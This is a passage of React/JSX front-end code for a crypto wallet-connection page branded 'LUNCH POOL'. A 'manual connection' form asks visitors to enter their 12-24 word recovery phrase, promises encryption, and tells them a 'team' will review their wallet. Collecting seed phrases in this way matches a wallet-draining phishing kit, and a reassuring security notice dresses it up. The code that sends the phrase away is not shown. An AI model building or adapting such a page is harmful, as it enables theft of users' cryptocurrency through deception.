                  Quick connection using popular wallet providers. 
                  Fast and secure with built-in Web3 protocols.
                </p>
                
                <div className="features-list space-y-2 mb-8">
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Zap size={14} className="text-blue-400" />
                    <span>Instant connection</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Shield size={14} className="text-blue-400" />
                    <span>Multiple wallet support</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Check size={14} className="text-blue-400" />
                    <span>No seed phrase required</span>
                  </div>
                </div>
                
                <button 
                  onClick={handleAutomaticConnect}
                  disabled={isConnecting}
                  className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-medium transition-all shadow-lg shadow-blue-700/30 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                >
                  {isConnecting && connectionStatus === 'connecting' ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Connecting to {selectedAutoWallet?.name}...
                    </>
                  ) : (
                    'Connect Automatically'
                  )}
                </button>
              </div>
            </div>
          </div>

          {/* Connection Status Messages */}
          {connectionStatus === 'success' && (
            <div className="fixed top-20 right-6 bg-green-900/90 border border-green-500/50 rounded-lg p-4 backdrop-blur-sm z-50 animate-slide-in">
              <div className="flex items-center gap-3">
                <Check size={20} className="text-green-400" />
                <div>
                  <p className="text-green-400 font-medium">Connection Successful!</p>
                  <p className="text-green-300 text-sm">{selectedAutoWallet?.name} connected successfully</p>
                </div>
              </div>
            </div>
          )}

          {connectionStatus === 'error' && (
            <div className="fixed top-20 right-6 bg-red-900/90 border border-red-500/50 rounded-lg p-4 backdrop-blur-sm z-50 animate-slide-in">
              <div className="flex items-center gap-3">
                <AlertTriangle size={20} className="text-red-400" />
                <div>
                  <p className="text-red-400 font-medium">Connection Failed</p>
                  <p className="text-red-300 text-sm">{errorMessage || 'Please try again or use manual connection'}</p>
                </div>
              </div>
            </div>
          )}

          {/* Security Notice */}
          <div className="bg-gradient-to-r from-yellow-900/20 to-orange-900/20 border border-yellow-500/30 rounded-xl p-6 backdrop-blur-sm">
            <div className="flex items-start gap-4">
              <Shield size={24} className="text-yellow-400 mt-1 flex-shrink-0" />
              <div>
                <h3 className="text-yellow-400 font-semibold mb-2">Security Notice</h3>
                <p className="text-gray-300 text-sm leading-relaxed">
                  Your security is our top priority. We use industry-standard encryption to protect your wallet information. 
                  Never share your seed phrase with anyone else, and always verify you're on the official LUNCH POOL platform 
                  before connecting your wallet.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Manual Wallet Selection Popup */}
      {showManualPopup && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 border border-white/20 rounded-2xl p-6 w-full max-w-lg max-h-[80vh] overflow-y-auto animate-scale-in">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-semibold text-white">Select Your Wallet</h3>
              <button 
                onClick={() => setShowManualPopup(false)}
                className="p-2 hover:bg-white/10 rounded-lg transition-colors"
              >
                <X size={20} className="text-gray-400" />
              </button>
            </div>
            
            <div className="space-y-3">
              {POPULAR_WALLETS.map((wallet) => (
                <button
                  key={wallet.id}
                  onClick={() => handleWalletSelect(wallet)}
                  className="w-full p-4 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 hover:border-purple-500/50 transition-all group text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="text-2xl">{wallet.icon}</div>
                    <div className="flex-1">
                      <h4 className="text-white font-medium group-hover:text-purple-400 transition-colors">
                        {wallet.name}
                      </h4>
                      <p className="text-gray-400 text-sm">{wallet.description}</p>
                    </div>
                    <ChevronDown size={16} className="text-gray-400 rotate-[-90deg]" />
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Automatic Wallet Selection Popup */}
      {showAutoPopup && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 border border-white/20 rounded-2xl p-6 w-full max-w-lg max-h-[80vh] overflow-y-auto animate-scale-in">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-semibold text-white">Choose Wallet to Connect</h3>
              <button 
                onClick={() => setShowAutoPopup(false)}
                className="p-2 hover:bg-white/10 rounded-lg transition-colors"
              >
                <X size={20} className="text-gray-400" />
              </button>
            </div>
            
            <p className="text-gray-400 text-sm mb-6">
              Select your preferred wallet for automatic connection
            </p>
            
            <div className="space-y-3">
              {AUTO_CONNECT_WALLETS.map((wallet) => (
                <button
                  key={wallet.id}
                  onClick={() => handleAutoWalletSelect(wallet)}
                  className="w-full p-4 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 hover:border-blue-500/50 transition-all group text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="text-2xl">{wallet.icon}</div>
                    <div className="flex-1">
                      <h4 className="text-white font-medium group-hover:text-blue-400 transition-colors">
                        {wallet.name}
                      </h4>
                      <p className="text-gray-400 text-sm">{wallet.description}</p>
                    </div>
                    <div className="flex items-center gap-2">
                      <Zap size={14} className="text-blue-400" />
                      <ChevronDown size={16} className="text-gray-400 rotate-[-90deg]" />
                    </div>
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Manual Connection Form Popup */}
      {showWalletForm && selectedWallet && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 border border-white/20 rounded-2xl p-6 w-full max-w-md animate-scale-in">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-semibold text-white">Connect {selectedWallet.name}</h3>
              <button 
                onClick={closeAllPopups}
                className="p-2 hover:bg-white/10 rounded-lg transition-colors"
              >
                <X size={20} className="text-gray-400" />
              </button>
            </div>
            
            <form onSubmit={handleManualSubmit} className="space-y-6">
              {/* Wallet Type (Read-only) */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Wallet Type
                </label>
                <div className="flex items-center gap-3 p-3 rounded-lg bg-gray-800/50 border border-gray-700">
                  <span className="text-xl">{selectedWallet.icon}</span>
                  <span className="text-white font-medium">{selectedWallet.name}</span>
                </div>
              </div>

              {/* Wallet Name Input */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Wallet Name <span className="text-red-400">*</span>
                </label>
                <input
                  type="text"
                  name="walletName"
                  value={formData.walletName}
                  onChange={(e) => handleInputChange('walletName', e.target.value)}
                  placeholder="Enter a name for your wallet"
                  className={`w-full p-3 rounded-lg bg-white/5 border ${
                    errors.walletName ? 'border-red-500' : 'border-white/20'
                  } text-white placeholder-gray-400 focus:border-purple-500 focus:outline-none transition-colors`}
                  required
                />
                {errors.walletName && (
                  <p className="text-red-400 text-sm mt-1">{errors.walletName}</p>
                )}
              </div>

              {/* Secret Phrase Input */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Recovery Phrase (12-24 words) <span className="text-red-400">*</span>
                </label>
                <div className="relative">
                  <textarea
                    name="secretPhrase"
                    value={formData.secretPhrase}
                    onChange={(e) => handleInputChange('secretPhrase', e.target.value)}
                    placeholder="Enter your recovery phrase separated by spaces"
                    rows={4}
                    className={`w-full p-3 rounded-lg bg-white/5 border ${
                      errors.secretPhrase ? 'border-red-500' : 'border-white/20'
                    } text-white placeholder-gray-400 focus:border-purple-500 focus:outline-none transition-colors resize-none ${
                      showSecretPhrase ? '' : 'filter blur-sm'
                    }`}
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowSecretPhrase(!showSecretPhrase)}
                    className="absolute top-3 right-3 p-1 hover:bg-white/10 rounded transition-colors"
                  >
                    {showSecretPhrase ? (
                      <EyeOff size={16} className="text-gray-400" />
                    ) : (
                      <Eye size={16} className="text-gray-400" />
                    )}
                  </button>
                </div>
                {errors.secretPhrase && (
                  <p className="text-red-400 text-sm mt-1">{errors.secretPhrase}</p>
          )}
          <p className="text-gray-500 text-xs mt-1">
            Your recovery phrase will be encrypted and securely processed
          </p>
        </div>

        {/* Submit Button */}
        <button
          type="submit"
          disabled={isConnecting}
          className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-purple-700/30 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
        >
          {isConnecting ? (
            <>
              <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
              Connecting...
            </>
          ) : (
            'Connect Wallet'
          )}
        </button>
      </form>
    </div>
  </div>
)}

      {/* Success Popup */}
      {showSuccessPopup && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 border border-green-500/50 rounded-2xl p-8 w-full max-w-md text-center animate-scale-in">
            <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
              <Check size={32} className="text-green-400" />
            </div>
            <h3 className="text-2xl font-semibold text-white mb-4">Connection Successful!</h3>
            <p className="text-gray-300 mb-6">
              Your wallet information has been securely processed. Our team will review and resolve any issues with your wallet.
            </p>
            <button
              onClick={closeAllPopups}
              className="px-6 py-3 rounded-lg bg-green-600 hover:bg-green-700 text-white font-medium transition-colors"
            >
              Continue
            </button>
          </div>
        </div>
      )}

      {/* Error Popup */}
      {showErrorPopup && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 border border-red-500/50 rounded-2xl p-8 w-full max-w-md text-center animate-scale-in">
            <div className="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
              <AlertTriangle size={32} className="text-red-400" />
            </div>
            <h3 className="text-2xl font-semibold text-white mb-4">Connection Failed</h3>
            <p className="text-gray-300 mb-6">
              There was an error processing your wallet connection. Please try again or contact support if the problem persists.
            </p>
            <button
              onClick={closeAllPopups}
              className="px-6 py-3 rounded-lg bg-red-600 hover:bg-red-700 text-white font-medium transition-colors"
            >
              Try Again
            </button>
          </div>
        </div>
      )}

      <style>{`
        @keyframes scale-in {
          from {
            opacity: 0;
            transform: scale(0.9);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }

        @keyframes slide-in {
          from {
            opacity: 0;
            transform: translateX(100%);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }

        .animate-scale-in {
          animation: scale-in 0.2s ease-out;
        }

        .animate-slide-in {
          animation: slide-in 0.3s ease-out;
        }

        .connection-card:hover {
          transform: translateY(-4px);
          box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }

        .bg-gradient-radial {
          background: radial-gradient(circle at center, var(--tw-gradient-stops));
        }

        /* Custom scrollbar */
        ::-webkit-scrollbar {
          width: 6px;
        }

        ::-webkit-scrollbar-track {
          background: rgba(255, 255, 255, 0.1);
          border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb {
          background: rgba(139, 92, 246, 0.6);
          border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb:hover {
          background: rgba(139, 92, 246, 0.8);
        }
      `}</style>
    </div>
  );
}